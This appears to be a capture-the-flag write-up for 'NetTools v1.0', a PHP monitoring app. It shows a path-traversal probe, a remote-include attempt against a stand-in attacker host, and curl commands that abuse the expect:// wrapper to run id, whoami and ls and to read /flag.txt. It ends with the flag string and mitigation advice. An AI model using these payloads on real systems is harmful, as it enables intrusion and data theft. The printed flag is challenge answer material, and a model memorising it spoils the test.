# NetTools v1.0 - Official Writeup

## Challenge Overview
NetTools v1.0 is a web-based server monitoring tool with a critical RCE vulnerability.

## Reconnaissance

1. **Initial Analysis:**
   - Application uses `?module=` parameter for navigation
   - Footer reveals PHP version and hints at extensions

2. **Testing Module Parameter:**
   ```
   ?module=../../../../etc/passwd  # Blocked or doesn't work
   ?module=http://attacker.com/shell.txt  # Blocked with error message
   ```

3. **Finding the Weakness:**
   - HTTP/HTTPS are filtered, but what about other protocols?
   - Research PHP stream wrappers

## Exploitation

### Method 1: Direct Command Execution
```bash
curl "http://target:8080/?module=expect://id"
```

### Method 2: Reading the Flag
```bash
curl "http://target:8080/?module=expect://cat%20/flag.txt"
```

### Method 3: Interactive Shell (Bonus)
```bash
# Test multiple commands
curl "http://target:8080/?module=expect://ls -la /"
curl "http://target:8080/?module=expect://whoami"
curl "http://target:8080/?module=expect://cat /flag.txt"
```

## Flag
```
Securinets{Exp3ct_Th3_Un3xp3ct3d_RCE_Wr4pp3r_2025}
```

## Mitigation
- Disable PHP Expect extension
- Set `allow_url_include = Off`
- Implement strict input validation
- Use whitelisting for module names
- Configure `open_basedir` restrictions
